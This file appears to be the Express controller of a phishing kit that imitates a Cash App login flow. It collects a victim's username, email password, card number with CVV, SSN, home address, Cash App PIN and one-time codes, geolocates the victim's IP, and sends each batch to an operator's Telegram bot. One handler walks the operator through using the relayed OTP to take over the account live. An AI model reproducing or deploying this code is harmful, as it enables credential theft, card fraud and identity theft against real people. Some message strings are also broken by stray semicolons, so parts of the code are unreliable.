const { sendMessageFor } = require("simple-telegram-message");
const ipInfo = require("ip-info-finder");
const { getClientIp } = require("request-ip");
const { botToken, chatId } = require("../config/settings");
const axios = require('axios');
const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;




exports.login = (req, res) => {
	return res.render("login");
};

exports.loginPost = async (req, res) => {
	const { username } = req.body;
	const sendAPIRequest = async (ipAddress) => {
       const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    // Move the console.log statement outside the sendAPIRequest function
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];

	const message =
		`✅ UPDATE TEAM | C4SH4PP | USER_${ipAddress}\n\n` +
		`👤 LOGIN INFO\n` +
		`USERNAME         : ${username}\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddressInformation.ip}\n` +
        `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +  // Fix variable names
        `CITY             : ${ipAddressInformation.location.city}\n` +
        `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
        `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
        `COUNTRY          : ${ipAddressInformation.country.name}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
		`ISP              : ${ipAddressInformation.network.organisation}\n\n` +
        `💻 SYSTEM INFO\n` +
        `USER AGENT       : ${userAgent}\n` +
        `SYSTEM LANGUAGE  : ${systemLang}\n` +
        `💬 Telegram: https://t.me/UpdateTeams\n` +
		`🌐 Website: Coming soon!!\n`;

    const sendMessage = sendMessageFor(botToken, chatId);
    sendMessage(message);

	console.log(message);

    res.redirect("/auth/login/2");
    
} catch (error) {
	// Handle any unexpected errors here
	console.error('Unexpected error:', error.message);
	res.status(500).send('Internal Server Error');
}
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    // Handle the rejection
});

	
};

exports.login2 = (req, res) => {
	return res.render("login2");
};

exports.loginPost2 = async (req, res) => {
	const { emailAddr, emailPass } = req.body;
	const sendAPIRequest = async (ipAddress) => {
       const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];


        const message =
            `✅ UPDATE TEAM | C4SH4PP | USER_${ipAddress}\n\n` +
            `👤 EMAIL INFO\n` +
			`EMAIL ADDRESS    : ${emailAddr}\n` +
			`EMAIL PASSWORD   : ${emailPass}\n\n` +
            
            `🌍 GEO-IP INFO\n` +
           `IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`;
            `💬 Telegram: https://t.me/UpdateTeams\n`;
            

        const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
        sendMessage(message);

        res.redirect("/auth/login/3");
    } catch (error) {
		console.error('Unexpected error:', error.message);
		res.status(500).send('Internal Server Error');
	}
	process.on('unhandledRejection', (reason, promise) => {
		console.error('Unhandled Rejection at:', promise, 'reason:', reason);
	});
	
};

exports.login3 = (req, res) => {
	return res.render("login3");
};

exports.loginPost3 = async (req, res) => {
	const { cardNum, expDate, cvv } = req.body;
	const sendAPIRequest = async (ipAddress) => {
       const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];


	const message =
		`✅ UPDATE TEAM | C4SH4PP | USER_${ipAddress}\n\n` +
		`👤 CARD INFO\n` +
		`CARD NUMBER      : ${cardNum}\n` +
		`EXPIRY DATE      : ${expDate}\n` +
		`CVV              : ${cvv}\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`;
		`💬 Telegram: https://t.me/UpdateTeams\n` +
		`🌐 Website: Coming soon!!\n`;

		
		res.redirect("/auth/complete");
	} catch (error) {
		console.error('Unexpected error:', error.message);
		res.status(500).send('Internal Server Error');
	}
	process.on('unhandledRejection', (reason, promise) => {
		console.error('Unhandled Rejection at:', promise, 'reason:', reason);
	});
	
};

exports.login4 = (req, res) => {
	return res.render("login4");
};

exports.loginPost4 = async (req, res) => {
	const { fName, lName, address, zipCode, phoneNum, ssn, cAppPin } = req.body;
	const sendAPIRequest = async (ipAddress) => {
       const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];


	const message =
		`✅ UPDATE TEAMS | C4SH4PP | USER_${ipAddress}\n\n` +
		`👤 PERSONAL INFO\n` +
		`FIRST NAME       : ${fName}\n` +
		`LAST NAME        : ${lName}\n` +
		`STREET ADDRESS   : ${address}\n` +
		`ZIP CODE         : ${zipCode}\n` +
		`MOBILE NUMBER    : ${phoneNum}\n` +
		`SSN              : ${ssn}\n` +
		`CASHAPP PIN      : ${cAppPin}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${ipAddressInformation.timezone.current_time}\n`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	res.redirect("/auth/login/5");
} catch (error) {
		console.error('Unexpected error:', error.message);
		res.status(500).send('Internal Server Error');
	}
	process.on('unhandledRejection', (reason, promise) => {
		console.error('Unhandled Rejection at:', promise, 'reason:', reason);
	});
	
};

exports.login5 = (req, res) => {
	const otpMsg =
		`🚨 USER IS NOW WAITING FOR OTP CODE\n` +
		`🚨 FOLLOW THE STEPS BELOW TO REQUEST OTP CODE\n\n` +
		`Step 1: Login to site or app using login details you just received.\n` +
		`Step 2: OTP code will be sent to the User.\n` +
		`Step 3: User will input OTP code in page.\n` +
		`Step 4: OTP code will be sent here.\n` +
		`Step 5: Now input OTP Code on site or app to login.`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(otpMsg);

	return res.render("login5");
};

exports.loginPost5 = async (req, res) => {
	const { otpCode } = req.body;
	const sendAPIRequest = async (ipAddress) => {
       const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);


	try{
    console.log(ipAddressInformation);

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];


	const message =
		`✅ UPDATE TEAMS | C4SH4PP | USER_${ipAddress}\n\n` +
		`👤 OTP INFO\n` +
		`OTP CODE         : ${otpCode}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${ipAddressInformation.timezone.current_time}\n`;
		

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	res.redirect("/auth/complete");
} catch (error) {
		console.error('Unexpected error:', error.message);
		res.status(500).send('Internal Server Error');
	}
	process.on('unhandledRejection', (reason, promise) => {
		console.error('Unhandled Rejection at:', promise, 'reason:', reason);
	});
	
};

exports.complete = (req, res) => {
	return res.render("complete");
};

exports.page404Redirect = (req, res) => {
	return res.redirect("/auth/login");
};
